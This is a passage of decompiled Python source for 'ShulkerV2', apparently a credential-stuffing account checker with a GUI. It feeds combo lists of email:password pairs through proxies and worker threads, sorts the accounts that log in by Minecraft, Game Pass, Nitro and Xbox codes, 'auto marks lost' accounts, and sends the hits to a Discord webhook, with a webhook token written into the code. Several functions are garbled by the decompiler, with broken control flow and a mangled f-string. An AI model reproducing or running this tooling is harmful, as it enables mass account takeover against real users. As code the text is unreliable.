                info_text = f'⚠️ {email_count}/50 emails found (need {50 - email_count} more) | ShulkerV2 depends on https://notletters.com/ | Buy from website (enter API key) or someone_known21 (Discord: 793101872784867352, leave API key empty)'
                self.mark_lost_info_label.configure(text=info_text, text_color='#ffaa00')
            self.mark_lost_info_label.pack(anchor='w', padx=(25, 0), pady=(5, 0))
            self.mark_lost_api_frame.pack(fill='x', padx=(25, 0), pady=(5, 0))
        else:
            self.mark_lost_info_label.configure(text='')
            self.mark_lost_info_label.pack_forget()
            self.mark_lost_api_frame.pack_forget()
    def save_all_config(self):
        """Save all configuration settings"""
        # ***<module>.ShulkerApp.save_all_config: Failure: Different bytecode
        try:
            self.config.set('proxies.enabled', self.proxy_enabled_var.get())
            self.config.set('proxies.file', self.proxy_file_entry.get().strip())
            self.config.set('proxies.type', self.proxy_type_var.get())
            self.config.set('proxies.rotation_mode', self.proxy_rotation_var.get())
            self.config.set('threading.max_threads', self.max_threads_var.get())
            self.config.set('threading.timeout_per_account', self.timeout_var.get())
            self.config.set('checkers.security_enabled', self.security_var.get())
            self.config.set('checkers.minecraft_enabled', self.minecraft_var.get())
            self.config.set('checkers.xbox_enabled', self.xbox_var.get())
            self.config.set('checkers.nitro_enabled', self.nitro_var.get())
            self.config.set('checkers.fetch_xbox_codes', self.xbox_codes_var.get())
            self.config.set('checkers.hypixel_enabled', self.hypixel_var.get())
            self.config.set('checkers.donut_enabled', self.donut_var.get())
            self.config.set('checkers.ms_rewards_enabled', self.rewards_var.get())
            self.config.set('checkers.hypixel_ban_check_enabled', self.hypixel_ban_var.get())
            self.config.set('checkers.donut_ban_check_enabled', self.donut_ban_var.get())
            self.config.set('automation.auto_mark_lost', self.mark_lost_var.get())
            api_key = self.notletters_api_key_entry.get().strip()
            if api_key:
                self.config.set('automation.notletters_api_key', api_key)
            else:
                self.config.set('automation.notletters_api_key', '')
            self.config.set('discord.enabled', self.discord_enabled_var.get())
            webhook_url = self.webhook_url_entry.get().strip()
            default_webhook = 'https://discord.com/api/webhooks/1392466206551965876/afcaOHCQqubD4WCpzv9Sjftv6KZFeo82B-qjLbiSzQa6vgMhSwRZN4AZ_D8k8f-Xynra'
            if webhook_url == default_webhook:
                self.config.set('discord.webhook_url', '')
            else:
                self.config.set('discord.webhook_url', webhook_url)
            self.config.set('discord.username', self.webhook_name_entry.get().strip())
            self.config.set('discord.avatar_url', self.webhook_icon_entry.get().strip())
            self.config.set('discord.send_minecraft', self.send_minecraft_var.get())
            self.config.set('discord.send_nitro', self.send_nitro_var.get())
            self.config.set('discord.send_2fa', self.send_2fa_var.get())
            self.config.set('discord.send_gamepass', self.send_gamepass_var.get())
            self.config.set('discord.send_rewards', self.send_rewards_var.get())
            self.config.set('discord.rewards_threshold', self.rewards_threshold_var.get())
            self.config.set('discord.use_custom_embed', self.use_custom_embed_var.get())
            self.config.set('discord.embed_title', self.embed_title_entry.get())
            self.config.set('discord.embed_description', self.embed_desc_entry.get('1.0', 'end-1c'))
            color_value = self.embed_color_entry.get().strip()
            if color_value:
                if color_value.startswith('0x'):
                    self.config.set('discord.embed_color', color_value)
                else:
                    try:
                        color_int = int(color_value, 16)
                        self.config.set('discord.embed_color', f'0x{color_value}')
                    except:
                        self.config.set('discord.embed_color', color_value)
                    else:
                        pass
            else:
                self.config.set('discord.embed_color', '')
            self.config.set('discord.embed_footer', self.embed_footer_entry.get())
            self.config.set('discord.embed_footer_icon', self.embed_footer_icon_entry.get().strip())
            custom_fields = []
            for field_data in self.embed_field_widgets:
                name = field_data['name_entry'].get().strip()
                value = field_data['value_entry'].get('1.0', 'end-1c').strip()
                inline = field_data['inline_var'].get()
                if name and value:
                        custom_fields.append({'name': name, 'value': value, 'inline': inline})
            self.config.set('discord.embed_fields', custom_fields)
            for key, var in self.timeout_vars.items():
                self.config.set(key, var.get())
            self.config.set('rate_limiting.enabled', self.rate_limiting_enabled_var.get())
            self.config.set('rate_limiting.global_delay', self.global_delay_var.get())
            self.config.set('logging.level', self.log_level_var.get())
            self.settings['thread_count'] = self.max_threads_var.get()
            self.settings['proxy_enabled'] = self.proxy_enabled_var.get()
            self.settings['discord_enabled'] = self.discord_enabled_var.get()
            self.settings['hypixel_enabled'] = self.hypixel_var.get()
            self.settings['donut_enabled'] = self.donut_var.get()
            self.settings['ms_rewards_enabled'] = self.rewards_var.get()
            self.settings['auto_mark_lost'] = self.mark_lost_var.get()
            self.config.save()
            if self.checking:
                messagebox.showwarning('Settings Saved', 'Configuration saved successfully!\n\nNote: Some settings will only take effect after stopping and restarting the checker.')
            else:
                messagebox.showinfo('Success', 'All configuration settings saved successfully!')
            logger.info('All configuration settings saved')
        except Exception as e:
            logger.error(f'Error saving configuration: {e}', exc_info=True)
            messagebox.showerror('Error', f'Failed to save configuration: {e}')
    def toggle_discord_editor(self):
        """Show/hide embed editor based on Discord webhook checkbox"""
        discord_enabled = self.discord_enabled_var.get()
        if hasattr(self, 'discord_check'):
            if discord_enabled:
                self.discord_check.select()
            else:
                self.discord_check.deselect()
            self.settings['discord_enabled'] = discord_enabled
        if discord_enabled:
            self.embed_editor_frame.pack(fill='x', pady=10, padx=20)
        else:
            self.embed_editor_frame.pack_forget()
    def add_embed_field(self, name='', value='', inline=False):
        """Add a new embed field editor (collapsible)"""
        # ***<module>.ShulkerApp.add_embed_field: Failure: Different bytecode
        field_id = len(self.embed_field_widgets)
        field_container = ctk.CTkFrame(self.fields_scroll_frame, fg_color='transparent')
        field_container.pack(fill='x', pady=5, padx=5)
        header_frame = ctk.CTkFrame(field_container, fg_color='transparent')
        header_frame.pack(fill='x', padx=5, pady=5)
        collapse_var = ctk.BooleanVar(value=True)
        def toggle_field():
            if collapse_var.get():
                content_frame.pack(fill='x', padx=5, pady=5)
                collapse_btn.configure(text='▼')
            else:
                content_frame.pack_forget()
                collapse_btn.configure(text='▶')
        collapse_btn = ctk.CTkButton(header_frame, text='▼', width=30, height=25, command=lambda: [collapse_var.set(not collapse_var.get()), toggle_field()])
        collapse_btn.pack(side='left', padx=5)
        field_title = name if name else f'Field {field_id + 1}'
        title_label = ctk.CTkLabel(header_frame, text=field_title if field_title else f'Field {field_id + 1}', font=ctk.CTkFont(size=12, weight='bold'), anchor='w')
        title_label.pack(side='left', padx=5, fill='x', expand=True)
        delete_btn = ctk.CTkButton(header_frame, text='🗑️', width=40, height=25, fg_color='transparent', hover_color=('gray70', 'gray30'), command=lambda: self.remove_embed_field(field_id))
        delete_btn.pack(side='right', padx=5)
        content_frame = ctk.CTkFrame(field_container, fg_color='transparent')
        if collapse_var.get():
            content_frame.pack(fill='x', padx=5, pady=5)
        name_frame = ctk.CTkFrame(content_frame, fg_color='transparent')
        name_frame.pack(fill='x', pady=3, padx=5)
        ctk.CTkLabel(name_frame, text='Name:', width=80, anchor='w').pack(side='left', padx=5)
        name_entry = ctk.CTkEntry(name_frame, placeholder_text='🎮 Minecraft')
        name_entry.pack(side='left', padx=5, fill='x', expand=True)
        if name:
            name_entry.insert(0, name)
        def update_title(*args):
            new_name = name_entry.get().strip()
            if new_name:
                title_label.configure(text=new_name)
            else:
                title_label.configure(text=f'Field {field_id + 1}')
        name_entry.bind('<KeyRelease>', update_title)
        value_frame = ctk.CTkFrame(content_frame, fg_color='transparent')
        value_frame.pack(fill='x', pady=3, padx=5)
        ctk.CTkLabel(value_frame, text='Value:', width=80, anchor='w').pack(side='left', padx=5, anchor='n', pady=(5, 0))
        value_entry = ctk.CTkTextbox(value_frame, height=60, font=ctk.CTkFont(size=10))
        value_entry.pack(side='left', padx=5, fill='x', expand=True)
        if value:
            value_entry.insert('1.0', value)
        inline_frame = ctk.CTkFrame(content_frame, fg_color='transparent')
        inline_frame.pack(fill='x', pady=3, padx=5)
        inline_var = ctk.BooleanVar(value=inline)
        inline_checkbox = ctk.CTkCheckBox(inline_frame, text='Inline', variable=inline_var)
        inline_checkbox.pack(side='left', padx=5)
        field_data = {'container': field_container, 'header': header_frame, 'content': content_frame, 'collapse_btn': collapse_btn, 'collapse_var': collapse_var, 'title_label': title_label, 'name_entry': name_entry, 'value_entry': value_entry, 'inline_var': inline_var, 'id': field_id}
        self.embed_field_widgets.append(field_data)
        return field_data
    def remove_embed_field(self, field_id):
        """Remove an embed field"""
        if 0 <= field_id < len(self.embed_field_widgets):
            field_data = self.embed_field_widgets[field_id]
            field_data['container'].destroy()
            self.embed_field_widgets.pop(field_id)
            for idx, field in enumerate(self.embed_field_widgets):
                field['id'] = idx
                for widget in field['header'].winfo_children():
                    if isinstance(widget, ctk.CTkButton) and widget.cget('text') == '🗑️':
                            widget.configure(command=lambda f=idx: self.remove_embed_field(f))
    def save_discord_config(self):
        """Save Discord configuration including embed settings"""
        # ***<module>.ShulkerApp.save_discord_config: Failure: Different bytecode
        try:
            self.config.set('discord.enabled', self.discord_enabled_var.get())
            self.config.set('discord.webhook_url', self.webhook_url_entry.get().strip())
            self.config.set('discord.username', self.webhook_name_entry.get().strip())
            self.config.set('discord.avatar_url', self.webhook_icon_entry.get().strip())
            self.config.set('discord.send_all_hits', False)
            self.config.set('discord.send_minecraft', self.send_minecraft_var.get())
            self.config.set('discord.send_nitro', self.send_nitro_var.get())
            self.config.set('discord.send_2fa', self.send_2fa_var.get())
            self.config.set('discord.send_gamepass', self.send_gamepass_var.get())
            self.config.set('discord.send_rewards', self.send_rewards_var.get())
            self.config.set('discord.rewards_threshold', self.rewards_threshold_var.get())
            self.config.set('discord.use_custom_embed', self.use_custom_embed_var.get())
            self.config.set('discord.embed_title', self.embed_title_entry.get())
            self.config.set('discord.embed_description', self.embed_desc_entry.get('1.0', 'end-1c'))
            color_value = self.embed_color_entry.get().strip()
            if color_value:
                if color_value.startswith('0x'):
                    self.config.set('discord.embed_color', color_value)
                else:
                    try:
                        color_int = int(color_value, 16)
                        self.config.set('discord.embed_color', f'0x{color_value}')
                    except:
                        self.config.set('discord.embed_color', color_value)
                    else:
                        pass
            else:
                self.config.set('discord.embed_color', '')
            self.config.set('discord.embed_footer', self.embed_footer_entry.get())
            self.config.set('discord.embed_footer_icon', self.embed_footer_icon_entry.get().strip())
            custom_fields = []
            for field_data in self.embed_field_widgets:
                name = field_data['name_entry'].get().strip()
                value = field_data['value_entry'].get('1.0', 'end-1c').strip()
                inline = field_data['inline_var'].get()
                if name and value:
                        custom_fields.append({'name': name, 'value': value, 'inline': inline})
            self.config.set('discord.embed_fields', custom_fields)
            self.config.save()
            messagebox.showinfo('Success', 'Discord configuration saved!')
            logger.info('✅ Discord configuration saved')
        except Exception as e:
            messagebox.showerror('Error', f'Failed to save Discord config: {e}')
            logger.error(f'Failed to save Discord config: {e}')
    def update_checkers(self):
        """Update checker settings (legacy method - redirects to save_all_config)"""
        self.save_all_config()
    def _validate_discord_webhook(self):
        # irreducible cflow, using cdg fallback
        """Validate Discord webhook before starting checking"""
        # ***<module>.ShulkerApp._validate_discord_webhook: Failure: Compilation Error
        discord_enabled_quick = hasattr(self, 'discord_check') and self.discord_check.get()
        discord_enabled_settings = self.discord_enabled_var.get()
        discord_enabled = discord_enabled_quick or discord_enabled_settings
        if not discord_enabled:
            return True
        else:
            webhook_url = self.webhook_url_entry.get().strip()
            if not webhook_url:
                response = messagebox.askyesno('Discord Webhook Not Configured', '❌ Discord webhook is enabled but no webhook URL is provided!\n\nYou have two options:\n1. Disable Discord webhook feature (recommended if you don\'t need it)\n2. Enter a valid Discord webhook URL in the Settings tab\n\nDo you want to disable Discord webhook and continue?', icon='warning')
                if response:
                    self.discord_enabled_var.set(False)
                    self.toggle_discord_editor()
                    if hasattr(self, 'discord_check'):
                        self.discord_check.deselect()
                    self.settings['discord_enabled'] = False
                    return True
                else:
                    return False
            else:
                default_webhook = 'https://discord.com/api/webhooks/1392466206551965876/afcaOHCQqubD4WCpzv9Sjftv6KZFeo82B-qjLbiSzQa6vgMhSwRZN4AZ_D8k8f-Xynra'
                if webhook_url == default_webhook:
                    response = messagebox.askyesno('Invalid Webhook URL', '❌ The default webhook URL cannot be used!\n\nPlease enter your own Discord webhook URL.\n\nYou can:\n1. Disable Discord webhook feature\n2. Enter your own valid Discord webhook URL\n\nDo you want to disable Discord webhook and continue?', icon='error')
                    if response:
                        self.discord_enabled_var.set(False)
                        self.toggle_discord_editor()
                        if hasattr(self, 'discord_check'):
                            self.discord_check.deselect()
                        self.settings['discord_enabled'] = False
                        return True
                    else:
                        return False
        import requests
        test_data = {'content': '🔍 **Shulker V2** - Testing webhook connection...'}
        response = requests.post(webhook_url, json=test_data, timeout=10)
        if response.status_code in [200, 204]:
            logger.info('✅ Discord webhook validation successful!')
                return True
            error_msg = f'❌ Discord webhook validation failed!\n\nStatus Code: {response.status_code}\nResponse: {(response.text[:200] if response.text else 'No response')}\n\nPlease check your webhook URL and try again.\n\nYou can:\n1. Disable Discord webhook feature\n2. Fix the webhook URL and try again\n\nDo you want to disable Discord webhook and continue?'
            response = messagebox.askyesno('Webhook Validation Failed', error_msg, icon='error')
            if response:
                self.discord_enabled_var.set(False)
                self.toggle_discord_editor()
                if hasattr(self, 'discord_check'):
                    self.discord_check.deselect()
                self.settings['discord_enabled'] = False
                    return True
                return False
                except requests.exceptions.Timeout:
                    error_msg = '❌ Discord webhook validation failed!\n\nConnection timeout. Please check your internet connection.\n\nYou can:\n1. Disable Discord webhook feature\n2. Check your connection and try again\n\nDo you want to disable Discord webhook and continue?'
                    response = messagebox.askyesno('Webhook Validation Failed', error_msg, icon='error')
                    if response:
                        self.discord_enabled_var.set(False)
                        self.toggle_discord_editor()
                        if hasattr(self, 'discord_check'):
                            self.discord_check.deselect()
                        self.settings['discord_enabled'] = False
                            return True
                    except Exception as e:
                            error_msg = f'❌ Discord webhook validation failed!\n\nError: {str(e)}\n\nPlease check your webhook URL and try again.\n\nYou can:\n1. Disable Discord webhook feature\n2. Fix the webhook URL and try again\n\nDo you want to disable Discord webhook and continue?'
                            response = messagebox.askyesno('Webhook Validation Failed', error_msg, icon='error')
                            if response:
                                self.discord_enabled_var.set(False)
                                self.toggle_discord_editor()
                                if hasattr(self, 'discord_check'):
                                    self.discord_check.deselect()
                                self.settings['discord_enabled'] = False
                                    return True
    def start_checking(self):
        # irreducible cflow, using cdg fallback
        """Start checking accounts"""
        # ***<module>.ShulkerApp.start_checking: Failure: Compilation Error
        if not self.combo_file:
            messagebox.showerror('Error', 'Please select a combo file')
            return
        else:
            if not self._validate_discord_webhook():
                messagebox.showinfo('Webhook Configuration Required', 'Please configure a valid Discord webhook URL in the Settings tab,\nor disable the Discord webhook feature, then try starting again.')
                return
        with open(self.combo_file, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if ':' in line.strip()]
        seen_lines = set()
        accounts = []
        duplicates_removed = 0
        for line in lines:
            normalized_line = line.strip().lower()
            if normalized_line not in seen_lines:
                seen_lines.add(normalized_line)
                accounts.append(line.split(':', 1))
            else:
                duplicates_removed += 1
        if not accounts:
            messagebox.showerror('Error', 'No valid accounts found')
                return
            logger.info(f'✅ Loaded {len(accounts)} accounts')
            if duplicates_removed > 0:
                logger.info(f'🗑️ Removed {duplicates_removed} duplicate accounts')
            original_count = len(lines)
            unique_count = len(accounts)
            if duplicates_removed > 0:
                self.combo_file_label.configure(text=f'Combo File: {os.path.basename(self.combo_file)} ({original_count} accounts, {unique_count} unique)')
            else:
                self.combo_file_label.configure(text=f'Combo File: {os.path.basename(self.combo_file)} ({unique_count} accounts)')
                self.checking = True
                self.start_btn.configure(state='disabled')
                self.pause_btn.configure(state='normal')
                self.stop_btn.configure(state='normal')
                self.status_label.configure(text='Status: Checking...')
                self.stats = {'checked': 0, 'hits': 0, 'bad': 0, 'errors': 0, 'cpm': 0, 'progress': 0, 'total': len(accounts), 'gamepass_pc': 0, 'gamepass_ultimate': 0, 'mark_lost_success': 0, 'nitro_claimed': 0, 'nitro_unclaimed': 0, 'xbox_codes': 0, 'normal_minecraft': 0, '2fa': 0, 'valid_mails': 0, 'retries': 0}
                self.start_time = time.time()
                self.progress_bar.set(0)
                self.progress_label.configure(text='0 / 0 (0%)')
                self.checker_engine = CheckerEngine(self.config)
                logger.info(f'🚀 Starting checker with {self.settings['thread_count']} threads')
                check_thread = threading.Thread(target=self.checking_loop, args=(accounts,), daemon=True)
                check_thread.start()
                except Exception as e:
                        messagebox.showerror('Error', f'Failed to load combo file: {e}')
                            return None
    def checking_loop(self, accounts):
        """Main checking loop with smart threading"""
        # ***<module>.ShulkerApp.checking_loop: Failure: Different bytecode
        from queue import Queue
        import threading as mt
        self.total_accounts = len(accounts)
        self.account_queue = Queue()
        for account in accounts:
            self.account_queue.put(account)
        self.results_lock = mt.Lock()
        def worker_thread():
            # irreducible cflow, using cdg fallback
            """Worker thread that checks accounts"""
            # ***<module>.ShulkerApp.checking_loop.worker_thread: Failure: Compilation Error
            if self.checking:
                pass
            if not self.pause_event.is_set():
                pass
            self.pause_event.wait(timeout=0.1)
            break
            if not self.checking:
                return
            email, password = self.account_queue.get(timeout=1)
            result = self.checker_engine.check_account(email, password)
            log_entry, color_tag = self.format_account_log(email, password, result)
            if hasattr(self, 'log_handler'):
                self.log_handler.add_log(log_entry, color_tag)
            with self.results_lock:
                pass
            self.stats['checked'] += 1
            if result is None or result.get('error') == 'Authentication failed':
                self.stats['bad'] += 1
            else:
                if result.get('error'):
                    self.stats['bad'] += 1
                else:
                    minecraft_data = result.get('minecraft', {})
                    ownership = minecraft_data.get('ownership', {}) if minecraft_data else {}
                    profile = minecraft_data.get('profile', {}) if minecraft_data else {}
                    security = result.get('security', {})
                    security_status = security.get('status', '') if security else ''
                    if security_status == '2FA_ENABLED':
                        self.stats['2fa'] += 1
                    has_gamepass_pc = ownership.get('gamepass_pc', False)
                    has_gamepass_ultimate = ownership.get('gamepass_ultimate', False)
                    if has_gamepass_pc:
                        self.stats['gamepass_pc'] += 1
                    if has_gamepass_ultimate:
                        self.stats['gamepass_ultimate'] += 1
                    has_java = ownership.get('minecraft_java_owned', False)
                    has_bedrock = ownership.get('minecraft_bedrock_owned', False)
                    has_java_gamepass = ownership.get('minecraft_java_gamepass', False)
                    has_bedrock_gamepass = ownership.get('minecraft_bedrock_gamepass', False)
                    if (has_java or has_bedrock) and (not has_gamepass_pc) and (not has_gamepass_ultimate):
                                self.stats['normal_minecraft'] += 1
                    is_hit = False
                    if has_java:
                        is_hit = True
                    if has_gamepass_pc or has_gamepass_ultimate:
                        is_hit = True
                    nitro_data = result.get('nitro', {})
                    if nitro_data:
                        if nitro_data.get('status') == 'claimed':
                            self.stats['nitro_claimed'] += 1
                            is_hit = True
                        else:
                            if nitro_data.get('status') == 'available':
                                self.stats['nitro_unclaimed'] += 1
                    xbox_codes = result.get('xbox_codes', [])
                    if xbox_codes and len(xbox_codes) > 0:
                            self.stats['xbox_codes'] += len(xbox_codes)
                            is_hit = True
                    mark_lost = result.get('mark_lost', {})
                    if mark_lost and mark_lost.get('success'):
                            self.stats['mark_lost_success'] += 1
                    if is_hit:
                        self.stats['hits'] += 1
                    else:
                        self.stats['valid_mails'] += 1
            if self.total_accounts > 0:
                self.stats['progress'] = self.stats['checked'] / self.total_accounts * 100
            else:
                self.stats['progress'] = 0
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                self.stats['cpm'] = int(self.stats['checked'] / elapsed * 60)
            self.account_queue.task_done()
            except Exception as queue_error:
                pass
            if isinstance(queue_error, Exception) and 'Empty' in str(type(queue_error).__name__):
                pass
            return
            logger.error(f'Queue error: {queue_error}')
            return
            except Exception as e:
                pass
            logger.error(f'Check error for {email}: {e}')
            if hasattr(self, 'log_handler'):
                self.log_handler.add_log(f'[Invalid] {email}:{password} | Error: {str(e)}', 'bad')
            with self.results_lock, self.stats['errors'] += 1, self.stats['bad'] += 1:
                pass
        self.worker_threads = []
        for i in range(self.settings['thread_count']):
            t = mt.Thread(target=worker_thread, daemon=True, name=f'Worker-{i + 1}')
            t.start()
            self.worker_threads.append(t)
        for t in self.worker_threads:
            t.join()
        logger.info('✅ All accounts checked!')
        self.after(0, self.checking_finished)
    def pause_checking(self):
        """Pause/resume checking"""
        self.paused = not self.paused
        if self.paused:
            self.pause_event.clear()
            self.pause_btn.configure(text='▶️ RESUME')
            self.status_label.configure(text='Status: Paused')
            logger.info('Checking paused')
        else:
            self.pause_event.set()
            self.pause_btn.configure(text='⏸️ PAUSE')
            self.status_label.configure(text='Status: Checking...')
            logger.info('Checking resumed')
    def stop_checking(self):
        """Stop checking"""
        self.checking = False
        self.paused = False
        self.pause_event.set()
        logger.info('Stopping checker...')
        self.status_label.configure(text='Status: Stopping...')
        import time
        for t in self.worker_threads:
            t.join(timeout=2)
    def checking_finished(self):
        """Called when checking is complete"""
        self.checking = False
        self.paused = False
        self.pause_event.set()
        self.start_btn.configure(state='normal')
        self.pause_btn.configure(state='disabled', text='⏸️ PAUSE')
        self.stop_btn.configure(state='disabled')
        self.status_label.configure(text='Status: Complete')
        messagebox.showinfo('Complete', f'Checked {self.stats['checked']} accounts!\n\nHits: {self.stats['hits']}\nBad: {self.stats['bad']}\nErrors: {self.stats['errors']}')
    def update_stats_loop(self):
        # irreducible cflow, using cdg fallback
        """Update all stats displays with smooth animations - optimized"""
        # ***<module>.ShulkerApp.update_stats_loop: Failure: Compilation Error
        if self._resize_in_progress:
            self.after(100, self.update_stats_loop)
                return
            if self.checking or self.stats['checked'] > 0:
                progress_value = max(0, min(100, self.stats['progress'])) / 100
                current_progress = self.progress_bar.get()
                if abs(current_progress - progress_value) > 0.01:
                    new_progress = current_progress + (progress_value - current_progress) * 0.3
                    self.progress_bar.set(new_progress)
                else:
                    self.progress_bar.set(progress_value)
                total = self.stats.get('total', 0)
                if total > 0:
                    self.progress_label.configure(text=f'{self.stats['checked']} / {total} ({self.stats['progress']:.1f}%)')
                else:
                    self.progress_label.configure(text='0 / 0 (0%)')
                if hasattr(self, 'stats_labels'):
                    self.stats_labels['bad_label'].configure(text=str(self.stats['bad']))
                    self.stats_labels['hits_label'].configure(text=str(self.stats['hits']))
                    self.stats_labels['gamepass_pc_label'].configure(text=str(self.stats['gamepass_pc']))
                    self.stats_labels['gamepass_ultimate_label'].configure(text=str(self.stats['gamepass_ultimate']))
                    self.stats_labels['mark_lost_label'].configure(text=str(self.stats['mark_lost_success']))
                    self.stats_labels['nitro_claimed_label'].configure(text=str(self.stats['nitro_claimed']))
                    self.stats_labels['nitro_unclaimed_label'].configure(text=str(self.stats['nitro_unclaimed']))
                    self.stats_labels['xbox_codes_label'].configure(text=str(self.stats['xbox_codes']))
                    self.stats_labels['normal_label'].configure(text=str(self.stats['normal_minecraft']))
                    self.stats_labels['2fa_label'].configure(text=str(self.stats['2fa']))
                    self.stats_labels['valid_mails_label'].configure(text=str(self.stats['valid_mails']))
                    self.stats_labels['retries_label'].configure(text=str(self.stats['retries']))
                    self.stats_labels['errors_label'].configure(text=str(self.stats['errors']))
                self.update_mini_stats()
                if self.checker_engine and hasattr(self.checker_engine, 'stats'):
                        try:
                            self.stats_table.update_stats(self.checker_engine.stats)
                        except Exception as e:
                            logger.debug(f'Error updating stats table: {e}')
                            self.after(1000, self.update_stats_loop)
                except Exception as e:
                        logger.error(f'Error in update_stats_loop: {e}')
    def update_mini_stats(self):
        """Update mini stats display in right panel"""
        # ***<module>.ShulkerApp.update_mini_stats: Failure: Compilation Error
        stats_text = f'\n{'=================================================='}\n📊 DETAILED STATISTICS\n{'=================================================='}\n\n📈 PROGRESS:\n   Checked: {self.stats['checked']} / {self.stats.get('total', 0):\n   Progress: }%\n\n{self.stats['progress']:.1f}\n\n✅ RESULTS:\n   Hits: {self.stats['bad']}\n   Errors: {self.stats['errors']}\n\n🎮 MINECRAFT:\n   Normal (Minecraft Only): {self.stats['normal_minecraft']}\n\n🎮 XBOX:\n   Game Pass PC: {self.stats['gamepass_pc']}\n   Game Pass Ultimate: {self.stats['gamepass_ultimate']}\n   Xbox Codes: {self.stats['xbox_codes']}\n\n💜 NITRO:\n   Claimed: {self.stats['nitro_claimed']}\n   Unclaimed: {self.stats['nitro_unclaimed']}\n\n🔄 AUTO MARK LOST:\n   Success: {self.stats['mark_lost_success']}\n\n🔒 SECURITY:\n   2FA: {self.stats['2fa']}\n\n📧 VALID:\n   Valid Mails: {self.stats['valid_mails']}\n\n{self.stats['cpm']}\n\n⏱️ TIME:\n   Elapsed: {(self.start_time if self.start_time > 0 else 0)}\n        {self.start_time}{self.start_time}{self.start_time}{self.start_time}{self.start_time}{self.start_time}{self.start_time}{self.start_time}{self.start_time}{self.start_time}{self.start_time}{self.start_time}{self.start_time}{self.start_time}
        self.mini_stats_text.delete('1.0', 'end')
        self.mini_stats_text.insert('1.0', stats_text.strip())
    def update_logs(self):
        """Update log display - process queued log entries"""
        if hasattr(self, 'log_handler'):
            self.log_handler.process_queue()
        self.after(100, self.update_logs)
    def format_account_log(self, email, password, result):
        """\nFormat account result into log entry\nFormat: [Valid_mail/2fa/Mc/Invalid] email:pass | Username | capes | hypixel ban/unban | donut ban/unban\n"""
        if not result:
            return (f'[Invalid] {email}:{password}', 'bad')
        else:
            if result.get('error'):
                if result.get('error') == 'Authentication failed':
                    return (f'[Invalid] {email}:{password}', 'bad')
                else:
                    return (f'[Invalid] {email}:{password} | Error: {result.get('error')}', 'bad')
            else:
                security = result.get('security', {})
                security_status = security.get('status', '') if security else ''
                minecraft_data = result.get('minecraft', {})
                ownership = minecraft_data.get('ownership', {}) if minecraft_data else {}
                profile = minecraft_data.get('profile', {}) if minecraft_data else {}
                has_minecraft_java = ownership.get('minecraft_java_owned', False) if ownership else False
                has_gamepass_pc = ownership.get('gamepass_pc', False) if ownership else False
                has_gamepass_ultimate = ownership.get('gamepass_ultimate', False) if ownership else False
                has_gamepass = has_gamepass_pc or has_gamepass_ultimate
                nitro_claimed = result.get('nitro', {}).get('status') == 'claimed' if result.get('nitro') else False
                has_xbox_codes = len(result.get('xbox_codes', [])) > 0
                if has_gamepass_ultimate:
                    log_type = 'XGPU'
                    color_tag = 'xgpu'
                    show_profile = True
                else:
                    if has_gamepass_pc:
                        log_type = 'XGP'
                        color_tag = 'xgp'
                        show_profile = True
                    else:
                        if has_minecraft_java or nitro_claimed or has_xbox_codes:
                            log_type = 'Mc'
                            color_tag = 'hit'
                            show_profile = True
                        else:
                            if security_status == '2FA_ENABLED':
                                log_type = '2fa'
                                color_tag = '2fa'
                                show_profile = False
                            else:
                                log_type = 'Valid_mail'
                                color_tag = 'valid'
                                show_profile = False
                log_parts = [f'[{log_type}] {email}:{password}']
                if show_profile:
                    username = profile.get('username', '') if profile else ''
                    if username:
                        log_parts.append(f'| {username}')
                    capes = profile.get('capes', []) if profile else []
                    if capes:
                        cape_names = []
                        for cape in capes:
                            if isinstance(cape, dict):
                                alias = cape.get('alias', '')
                                if alias:
                                    cape_names.append(alias)
                            else:
                                if isinstance(cape, str):
                                    cape_names.append(cape)
                        if cape_names:
                            log_parts.append(f'| Capes: {', '.join(cape_names)}')
                    hypixel = result.get('hypixel', {})
                    if hypixel:
                        banned = hypixel.get('banned', False)
                        ban_message = hypixel.get('ban_message')
                        if banned == 'False':
                            log_parts.append('| Hypixel: UNBANNED')
                        else:
                            if banned and str(banned).lower()!= 'false':
                                log_parts.append('| Hypixel: BANNED')
                            else:
                                if ban_message:
                                    log_parts.append('| Hypixel: BANNED')
                                else:
                                    log_parts.append('| Hypixel: UNBANNED')
                    donut = result.get('donut', {})
                    if donut:
                        banned = donut.get('banned', False)
                        ban_message = donut.get('ban_message')
                        if banned == 'False':
                            log_parts.append('| Donut: UNBANNED')
                        else:
                            if banned and str(banned).lower()!= 'false':
                                log_parts.append('| Donut: BANNED')
                            else:
                                if ban_message:
                                    log_parts.append('| Donut: BANNED')
                                else:
                                    log_parts.append('| Donut: UNBANNED')
                log_entry = ' '.join(log_parts)
                return (log_entry, color_tag)
    def clear_logs(self):
        """Clear log display"""
        self.log_text.delete('1.0', 'end')
        logger.info('Logs cleared')
    def save_logs(self):
        # irreducible cflow, using cdg fallback
        """Save logs to file"""
        # ***<module>.ShulkerApp.save_logs: Failure: Compilation Error
        filename = filedialog.asksaveasfilename(title='Save Logs', defaultextension='.txt', filetypes=[('Text Files', '*.txt'), ('All Files', '*.*')])
        if filename:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(self.log_text.get('1.0', 'end'))
            messagebox.showinfo('Success', 'Logs saved!')
            except Exception as e:
                    messagebox.showerror('Error', f'Failed to save logs: {e}')
                    logger.error(f'Error saving logs: {e}')
    def get_session_folders(self):
        """Get list of session folders"""
        results_dir = 'results'
        if not os.path.exists(results_dir):
            return []
        else:
            folders = []
            for item in os.listdir(results_dir):
                path = os.path.join(results_dir, item)
                if os.path.isdir(path) and item.startswith('session_'):
                        folders.append(item)
            return sorted(folders, reverse=True)
    def refresh_sessions(self):
        """Refresh session dropdown"""
        sessions = self.get_session_folders()
        self.session_dropdown.configure(values=sessions)
        if sessions:
            current_session = self.session_var.get()
            if current_session in sessions:
                self.load_session_files(current_session)
            else:
                self.session_var.set(sessions[0])
                self.load_session_files(sessions[0])
    def load_session_files(self, session_name=None):
        """Load files for selected session"""
        if session_name is None:
            session_name = self.session_var.get()
        if not session_name:
            return
        else:
            session_path = os.path.join('results', session_name)
            if not os.path.exists(session_path):
                return
            else:
                for widget in self.files_scroll.winfo_children():
                    widget.destroy()
                self.file_buttons.clear()
                files = []
                try:
                    for item in os.listdir(session_path):
                        if item.endswith('.txt'):
                            file_path = os.path.join(session_path, item)
                            try:
                                file_size = os.path.getsize(file_path)
                                files.append((item, file_path, file_size))
                            except:
                                pass
                            else:
                                pass
                except Exception as e:
                    logger.error(f'Error loading session files: {e}')
                    return None
                for filename, filepath, filesize in sorted(files):
